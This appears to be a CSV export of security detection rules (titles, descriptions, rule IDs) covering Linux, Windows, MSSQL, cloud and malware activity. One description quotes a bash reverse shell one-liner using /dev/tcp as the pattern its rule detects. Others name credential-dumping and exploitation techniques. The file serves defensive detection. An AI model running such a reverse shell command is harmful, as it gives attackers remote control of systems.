id:ID,:Title,description,rule_id
Linux Keylogging with Pam.d,,Detect attempt to enable auditing of TTY input,49aae26c-450e-448b-911d-b3c13d178dfc
Linux Recon Indicators,,Detects events with patterns found in commands used for reconnaissance on linux systems,0cf7a157-8879-41a2-8f55-388dd23746b7
Linux Reverse Shell Indicator,,Detects a bash contecting to a remote IP address (often found when actors do something like 'bash -i >& /dev/tcp/10.0.0.1/4242 0>&1'),83dcd9f6-9ca8-4af7-a16e-a1c7a6b51871
Linux Shell Pipe to Shell,,Detects suspicious process command line that starts with a shell that executes something and finally gets piped into another shell,880973f3-9708-491c-a77b-2a35a1921158
Linux Webshell Indicators,,Detects suspicious sub processes of web server processes,818f7b24-0fba-4c49-a073-8b755573b9c7
Live Memory Dump Using Powershell,,Detects usage of a PowerShell command to dump the live memory of a Windows machine,cd185561-4760-45d6-a63e-a51325112cae
LiveKD Driver Creation,,"Detects the creation of the LiveKD driver, which is used for live kernel debugging",16fe46bb-4f64-46aa-817d-ff7bec4a2352
LiveKD Driver Creation By Uncommon Process,,"Detects the creation of the LiveKD driver by a process image other than ""livekd.exe"".",059c5af9-5131-4d8d-92b2-de4ad6146712
LiveKD Kernel Memory Dump File Created,,Detects the creation of a file that has the same name as the default LiveKD kernel memory dump.,814ddeca-3d31-4265-8e07-8cc54fb44903
Load Of RstrtMgr.DLL By A Suspicious Process,,"Detects the load of RstrtMgr DLL (Restart Manager) by a suspicious process.
This library has been used during ransomware campaigns to kill processes that would prevent file encryption by locking them (e.g. Conti ransomware, Cactus ransomware). It has also recently been seen used by the BiBi wiper for Windows.
It could also be used for anti-analysis purposes by shut downing specific processes.
",b48492dc-c5ef-4572-8dff-32bc241c15c8
LoadBalancer Security Group Modification,,"Detects changes to the security groups associated with an Elastic Load Balancer (ELB) or Application Load Balancer (ALB).
This can indicate that a misconfiguration allowing more traffic into the system than required, or could indicate that an attacker is attempting to enable new connections into a VPC or subnet controlled by the account.
",7a4409fc-f8ca-45f6-8006-127d779eaad9
Loaded Module Enumeration Via Tasklist.EXE,,"Detects the enumeration of a specific DLL or EXE being used by a binary via ""tasklist.exe"".
This is often used by attackers in order to find the specific process identifier (PID) that is using the DLL in question.
In order to dump the process memory or perform other nefarious actions.
",34275eb8-fa19-436b-b959-3d9ecd53fa1f
Loading Diagcab Package From Remote Path,,"Detects loading of diagcab packages from a remote path, as seen in DogWalk vulnerability",50cb47b8-2c33-4b23-a2e9-4600657d9746
Loading of Kernel Module via Insmod,,"Detects loading of kernel modules with insmod command.
Loadable Kernel Modules (LKMs) are pieces of code that can be loaded and unloaded into the kernel upon demand.
Adversaries may use LKMs to obtain persistence within the system or elevate the privileges.
",106d7cbd-80ff-4985-b682-a7043e5acb72
Local File Read Using Curl.EXE,,"Detects execution of ""curl.exe"" with the ""file://"" protocol handler in order to read local files.",aa6f6ea6-0676-40dd-b510-6e46f02d8867
Local Network Connection Initiated By Script Interpreter,,"Detects a script interpreter (Wscript/Cscript) initiating a local network connection to download or execute a script hosted on a shared folder.
",08249dc0-a28d-4555-8ba5-9255a198e08c
Local Privilege Escalation Indicator TabTip,,Detects the invocation of TabTip via CLSID as seen when JuicyPotatoNG is used on a system in brute force mode,bc2e25ed-b92b-4daa-b074-b502bdd1982b
LockerGoga Ransomware Activity,,Detects LockerGoga ransomware activity via specific command line.,74db3488-fd28-480a-95aa-b7af626de068
Log4j RCE CVE-2021-44228 Generic,,Detects exploitation attempt against log4j RCE vulnerability reported as CVE-2021-44228 (Log4Shell),5ea8faa8-db8b-45be-89b0-151b84c82702
Log4j RCE CVE-2021-44228 in Fields,,Detects exploitation attempt against log4j RCE vulnerability reported as CVE-2021-44228 in different header fields found in web server logs (Log4Shell),9be472ed-893c-4ec0-94da-312d2765f654
Logged-On User Password Change Via Ksetup.EXE,,"Detects password change for the logged-on user's via ""ksetup.exe""",c9783e20-4793-4164-ba96-d9ee483992c4
Logging Configuration Changes on Linux Host,,Detect changes of syslog daemons configuration files,c830f15d-6f6e-430f-8074-6f73d6807841
Login to Disabled Account,,Detect failed attempts to sign in to disabled accounts.,908655e0-25cf-4ae1-b775-1c8ce9cf43d8
Logon from a Risky IP Address,,Detects when a Microsoft Cloud App Security reported when a user signs into your sanctioned apps from a risky IP address.,c191e2fa-f9d6-4ccf-82af-4f2aba08359f
Lolbas OneDriveStandaloneUpdater.exe Proxy Download,,"Detects setting a custom URL for OneDriveStandaloneUpdater.exe to download a file from the Internet without executing any
anomalous executables with suspicious arguments. The downloaded file will be in C:\Users\redacted\AppData\Local\Microsoft\OneDrive\StandaloneUpdaterreSignInSettingsConfig.json
",3aff0be0-7802-4a7e-a4fa-c60c74bc5e1d
Lolbin Runexehelper Use As Proxy,,"Detect usage of the ""runexehelper.exe"" binary as a proxy to launch other programs",cd71385d-fd9b-4691-9b98-2b1f7e508714
Lolbin Unregmp2.exe Use As Proxy,,"Detect usage of the ""unregmp2.exe"" binary as a proxy to launch a custom version of ""wmpnscfg.exe""",727454c0-d851-48b0-8b89-385611ab0704
Lsass Full Dump Request Via DumpType Registry Settings,,"Detects the setting of the ""DumpType"" registry value to ""2"" which stands for a ""Full Dump"". Technique such as LSASS Shtinkering requires this value to be ""2"" in order to dump LSASS.",33efc23c-6ea2-4503-8cfe-bdf82ce8f719
Lsass Memory Dump via Comsvcs DLL,,Detects adversaries leveraging the MiniDump export function from comsvcs.dll via rundll32 to perform a memory dump from lsass.,a49fa4d5-11db-418c-8473-1e014a8dd462
Lummac Stealer Activity - Execution Of More.com And Vbc.exe,,"Detects the execution of more.com and vbc.exe in the process tree.
This behavior was observed by a set of samples related to Lummac Stealer.
The Lummac payload is injected into the vbc.exe process.
",19b3806e-46f2-4b4c-9337-e3d8653245ea
MERCURY APT Activity,,Detects suspicious command line patterns seen being used by MERCURY APT,a62298a3-1fe0-422f-9a68-ffbcbc5a123d
MITRE BZAR Indicators for Execution,,Windows DCE-RPC functions which indicate an execution techniques on the remote system. All credit for the Zeek mapping of the suspicious endpoint/operation field goes to MITRE,b640c0b8-87f8-4daa-aef8-95a24261dd1d
MITRE BZAR Indicators for Persistence,,Windows DCE-RPC functions which indicate a persistence techniques on the remote system. All credit for the Zeek mapping of the suspicious endpoint/operation field goes to MITRE.,53389db6-ba46-48e3-a94c-e0f2cefe1583
MMC Spawning Windows Shell,,Detects a Windows command line executable started from MMC,05a2ab7e-ce11-4b63-86db-ab32e763e11d
MMC20 Lateral Movement,,"Detects MMC20.Application Lateral Movement; specifically looks for the spawning of the parent MMC.exe with a command line of ""-Embedding"" as a child of svchost.exe",f1f3bf22-deb2-418d-8cce-e1a45e46a5bd
MOVEit CVE-2023-34362 Exploitation Attempt - Potential Web Shell Request,,Detects get requests to specific files used during the exploitation of MOVEit CVE-2023-34362,435e41f2-48eb-4c95-8a2b-ed24b50ec30b
MSExchange Transport Agent Installation,,Detects the Installation of a Exchange Transport Agent,83809e84-4475-4b69-bc3e-4aad8568612f
MSExchange Transport Agent Installation - Builtin,,Detects the Installation of a Exchange Transport Agent,4fe151c2-ecf9-4fae-95ae-b88ec9c2fca6
MSHTA Execution with Suspicious File Extensions,,"Detects execution of mshta.exe with file types that looks like they do not typically represent HTA (HTML Application) content,
such as .png, .jpg, .zip, .pdf, and others, which are often polyglots. MSHTA is a legitimate Windows utility for executing HTML Applications
containing VBScript or JScript. Threat actors often abuse this lolbin utility to download and
execute malicious scripts disguised as benign files or hosted under misleading extensions to evade detection.
",cc7abbd0-762b-41e3-8a26-57ad50d2eea3
MSI Installation From Suspicious Locations,,Detects MSI package installation from suspicious locations,c7c8aa1c-5aff-408e-828b-998e3620b341
MSI Installation From Web,,Detects installation of a remote msi file from web.,5594e67a-7f92-4a04-b65d-1a42fd824a60
MSMQ Corrupted Packet Encountered,,Detects corrupted packets sent to the MSMQ service. Could potentially be a sign of CVE-2023-21554 exploitation,ae94b10d-fee9-4767-82bb-439b309d5a27
MSSQL Add Account To Sysadmin Role,,Detects when an attacker tries to backdoor the MSSQL server by adding a backdoor account to the sysadmin fixed server role,08200f85-2678-463e-9c32-88dce2f073d1
MSSQL Destructive Query,,"Detects the invocation of MS SQL transactions that are destructive towards table or database data, such as ""DROP TABLE"" or ""DROP DATABASE"".
",00321fee-ca72-4cce-b011-5415af3b9960
MSSQL Disable Audit Settings,,"Detects when an attacker calls the ""ALTER SERVER AUDIT"" or ""DROP SERVER AUDIT"" transaction in order to delete or disable audit logs on the server",350dfb37-3706-4cdc-9e2e-5e24bc3a46df
MSSQL Extended Stored Procedure Backdoor Maggie,,This rule detects the execution of the extended storage procedure backdoor named Maggie in the context of Microsoft SQL server,711ab2fe-c9ba-4746-8840-5228a58c3cb8
MSSQL SPProcoption Set,,Detects when the a stored procedure is set or cleared for automatic execution in MSSQL. A stored procedure that is set to automatic execution runs every time an instance of SQL Server is started,b3d57a5c-c92e-4b48-9a79-5f124b7cf964
MSSQL Server Failed Logon From External Network,,Detects failed logon attempts from clients with external network IP to an MSSQL server. This can be a sign of a bruteforce attack.,ebfe73c2-5bc9-4ed9-aaa8-8b54b2b4777d
MSSQL XPCmdshell Option Change,,"Detects when the MSSQL ""xp_cmdshell"" stored procedure setting is changed.
",d08dd86f-681e-4a00-a92c-1db218754417
MSSQL XPCmdshell Suspicious Execution,,"Detects when the MSSQL ""xp_cmdshell"" stored procedure is used to execute commands",7f103213-a04e-4d59-8261-213dddf22314
MacOS Emond Launch Daemon,,Detects additions to the Emond Launch Daemon that adversaries may use to gain persistence and elevate privileges.,23c43900-e732-45a4-8354-63e4a6c187ce
MacOS Scripting Interpreter AppleScript,,Detects execution of AppleScript of the macOS scripting language AppleScript.,1bc2e6c5-0885-472b-bed6-be5ea8eace55
Macro Enabled In A Potentially Suspicious Document,,Detects registry changes to Office trust records where the path is located in a potentially suspicious location,a166f74e-bf44-409d-b9ba-ea4b2dd8b3cd
Mailbox Export to Exchange Webserver,,Detects a successful export of an Exchange mailbox to untypical directory or with aspx name suffix which can be used to place a webshell or the needed role assignment for it,516376b4-05cd-4122-bae0-ad7641c38d48
Malicious Base64 Encoded PowerShell Keywords in Command Lines,,Detects base64 encoded strings used in hidden malicious PowerShell command lines,f26c6093-6f14-4b12-800f-0fcb46f5ffd0
Malicious DLL File Dropped in the Teams or OneDrive Folder,,"Detects creation of a malicious DLL file in the location where the OneDrive or Team applications
Upon execution of the Teams or OneDrive application, the dropped malicious DLL file (""iphlpapi.dll"") is sideloaded
",1908fcc1-1b92-4272-8214-0fbaf2fa5163
Malicious DLL Load By Compromised 3CXDesktopApp,,Detects DLL load activity of known compromised DLLs used in by the compromised 3CXDesktopApp,d0b65ad3-e945-435e-a7a9-438e62dd48e9
Malicious Driver Load,,Detects loading of known malicious drivers via their hash.,05296024-fe8a-4baf-8f3d-9a5f5624ceb2
Malicious Driver Load By Name,,Detects loading of known malicious drivers via the file name of the drivers.,39b64854-5497-4b57-a448-40977b8c9679
Malicious IP Address Sign-In Failure Rate,,Indicates sign-in from a malicious IP address based on high failure rates.,a3f55ebd-0c01-4ed6-adc0-8fb76d8cd3cd
Malicious IP Address Sign-In Suspicious,,Indicates sign-in from a malicious IP address known to be malicious at time of sign-in.,36440e1c-5c22-467a-889b-593e66498472
Malicious Named Pipe Created,,Detects the creation of a named pipe seen used by known APTs or malware.,fe3ac066-98bb-432a-b1e7-a5229cb39d4a
Malicious Nishang PowerShell Commandlets,,Detects Commandlet names and arguments from the Nishang exploitation framework,f772cee9-b7c2-4cb2-8f07-49870adc02e0
Malicious PE Execution by Microsoft Visual Studio Debugger,,"There is an option for a MS VS Just-In-Time Debugger ""vsjitdebugger.exe"" to launch specified executable and attach a debugger.
This option may be used adversaries to execute malicious code by signed verified binary.
The debugger is installed alongside with Microsoft Visual Studio package.
",15c7904e-6ad1-4a45-9b46-5fb25df37fd2
Malicious PowerShell Commandlets - PoshModule,,Detects Commandlet names from well-known PowerShell exploitation frameworks,7d0d0329-0ef1-4e84-a9f5-49500f9d7c6c
Malicious PowerShell Commandlets - ProcessCreation,,Detects Commandlet names from well-known PowerShell exploitation frameworks,02030f2f-6199-49ec-b258-ea71b07e03dc
Malicious PowerShell Commandlets - ScriptBlock,,Detects Commandlet names from well-known PowerShell exploitation frameworks,89819aa4-bbd6-46bc-88ec-c7f7fe30efa6
Malicious PowerShell Keywords,,Detects keywords from well-known PowerShell exploitation frameworks,f62176f3-8128-4faa-bf6c-83261322e5eb
Malicious PowerShell Scripts - FileCreation,,Detects the creation of known offensive powershell scripts used for exploitation,f331aa1f-8c53-4fc3-b083-cc159bc971cb
Malicious PowerShell Scripts - PoshModule,,Detects the execution of known offensive powershell scripts used for exploitation or reconnaissance,41025fd7-0466-4650-a813-574aaacbe7f4
Malicious ShellIntel PowerShell Commandlets,,Detects Commandlet names from ShellIntel exploitation scripts.,402e1e1d-ad59-47b6-bf80-1ee44985b3a7
Malicious Usage Of IMDS Credentials Outside Of AWS Infrastructure,,"Detects when an instance identity has taken an action that isn't inside SSM.
This can indicate that a compromised EC2 instance is being used as a pivot point.
",352a918a-34d8-4882-8470-44830c507aa3
Malware Shellcode in Verclsid Target Process,,Detects a process access to verclsid.exe that injects shellcode from a Microsoft Office application / VBA macro,b7967e22-3d7e-409b-9ed5-cdae3f9243a1
Malware User Agent,,Detects suspicious user agent strings used by malware in proxy logs,5c84856b-55a5-45f1-826f-13f37250cf4e
ManageEngine Endpoint Central Dctask64.EXE Potential Abuse,,"Detects the execution of ""dctask64.exe"", a signed binary by ZOHO Corporation part of ManageEngine Endpoint Central.
This binary can be abused for DLL injection, arbitrary command and process execution.
",6345b048-8441-43a7-9bed-541133633d7a
